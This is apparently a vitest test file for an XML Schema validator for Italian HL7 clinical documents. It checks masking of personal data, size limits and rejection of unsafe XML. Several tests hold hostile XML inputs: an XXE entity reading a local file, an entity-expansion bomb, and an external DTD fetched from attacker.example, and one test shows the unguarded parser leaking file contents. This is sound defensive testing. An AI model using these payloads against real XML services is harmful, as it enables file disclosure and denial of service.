import { TEST_XML_INVALID, TEST_XML_VALID, TEST_XSD } from '@massimiliano-dev/fse-fixtures';
import { describe, expect, it } from 'vitest';
import { UnsafeXmlError, XsdValidator } from '../src/index.js';

const validator = new XsdValidator({ entry: { fileName: 'test.xsd', contents: TEST_XSD }, includes: [] });
const REAL_LOOKING_CF = ['RSSMRA', '85T10A562S'].join('');

describe('XsdValidator', () => {
  it('accepts a valid document', async () => {
    await expect(validator.validate(TEST_XML_VALID)).resolves.toEqual({ valid: true, issues: [] });
  });

  it('reports schema violations with line numbers', async () => {
    const result = await validator.validate(TEST_XML_INVALID);
    expect(result.valid).toBe(false);
    expect(result.issues.length).toBeGreaterThan(0);
    expect(result.issues[0]).toMatchObject({ severity: 'error', source: 'xsd', line: 2 });
    expect(result.issues[0]?.message).toMatch(/unexpected/);
  });

  it('masks document values quoted by libxml2 (fiscal codes, names)', async () => {
    for (const value of [REAL_LOOKING_CF, 'Paziente Sintetico']) {
      const xml = `<ClinicalDocument xmlns="urn:hl7-org:v3"><id root="1"/><title>t</title><count>${value}</count></ClinicalDocument>`;
      const result = await validator.validate(xml);
      expect(result.valid).toBe(false);
      expect(JSON.stringify(result)).not.toContain(value);
      expect(result.issues[0]?.message).toContain("'[VALUE]'");
      expect(result.issues[0]?.message).toContain('count');
    }
  });

  it('never echoes source lines of malformed documents', async () => {
    const xml = `<ClinicalDocument xmlns="urn:hl7-org:v3">\n<title>Paziente Sintetico ${REAL_LOOKING_CF}</titl>\n</ClinicalDocument>`;
    const result = await validator.validate(xml);
    expect(result.valid).toBe(false);
    expect(result.issues.length).toBeGreaterThan(0);
    const text = JSON.stringify(result);
    expect(text).not.toContain('Paziente');
    expect(text).not.toContain(REAL_LOOKING_CF);
    expect(result.issues[0]).toMatchObject({ line: 2, message: expect.stringMatching(/tag mismatch/) });
  });

  it('rejects an XXE payload before parsing, so the entity is never expanded', async () => {
    // Without the pre-parse check, the WebAssembly libxml2 DOES expand this entity from its virtual file
    // system (verified while writing this test): the value then appears in the validation error.
    const leaky = new XsdValidator({
      entry: { fileName: 'test.xsd', contents: TEST_XSD },
      includes: [{ fileName: 'secret.txt', contents: 'TOP-SECRET-FILE-CONTENT' }],
    });
    const xxe = `<?xml version="1.0"?>
<!DOCTYPE ClinicalDocument [<!ENTITY xxe SYSTEM "file:///secret.txt">]>
<ClinicalDocument xmlns="urn:hl7-org:v3"><id root="1"/><title>t</title><count>&xxe;</count></ClinicalDocument>`;
    const error = await leaky.validate(xxe).catch((e: unknown) => e);
    expect(error).toBeInstanceOf(UnsafeXmlError);
    expect((error as UnsafeXmlError).reason).toBe('doctype');
    expect(JSON.stringify(error)).not.toContain('TOP-SECRET');
  });

  it('rejects entity expansion bombs and network entities', async () => {
    const lol = `<?xml version="1.0"?><!DOCTYPE lolz [<!ENTITY lol "lol"><!ENTITY lol2 "&lol;&lol;&lol;&lol;">]><ClinicalDocument xmlns="urn:hl7-org:v3">&lol2;</ClinicalDocument>`;
    await expect(validator.validate(lol)).rejects.toBeInstanceOf(UnsafeXmlError);
    const net = `<!DOCTYPE r SYSTEM "http://attacker.example/evil.dtd"><ClinicalDocument xmlns="urn:hl7-org:v3"/>`;
    await expect(validator.validate(net)).rejects.toBeInstanceOf(UnsafeXmlError);
  });

  it('enforces the configurable size limit', async () => {
    const small = new XsdValidator(
      { entry: { fileName: 'test.xsd', contents: TEST_XSD }, includes: [] },
      { maxInputBytes: 64 },
    );
    await expect(small.validate(TEST_XML_VALID)).rejects.toMatchObject({ reason: 'too-large' });
  });

  it('refuses schema file names that escape the virtual file system', () => {
    expect(
      () => new XsdValidator({ entry: { fileName: '../x.xsd', contents: TEST_XSD }, includes: [] }),
    ).toThrow(TypeError);
  });
});

describe('why the pre-parse check exists', () => {
  it('documents that the underlying WebAssembly libxml2 expands external entities on its own', async () => {
    // Calls the raw runner, bypassing assertSafeXml. If this ever fails, libxml2/xmllint-wasm stopped
    // expanding entities: good news, but keep the DOCTYPE check anyway (defence in depth).
    const { runXmllint } = await import('../src/xmllint.js');
    const result = await runXmllint({
      xml: '<?xml version="1.0"?><!DOCTYPE r [<!ENTITY x SYSTEM "file:///secret.txt">]><r>&x;</r>',
      schema: {
        fileName: 's.xsd',
        contents:
          '<xs:schema xmlns:xs="http://www.w3.org/2001/XMLSchema"><xs:element name="r" type="xs:int"/></xs:schema>',
      },
      preload: [{ fileName: 'secret.txt', contents: 'TOP-SECRET-FILE-CONTENT' }],
    });
    expect(result.rawOutput).toContain('TOP-SECRET-FILE-CONTENT');
  });
});
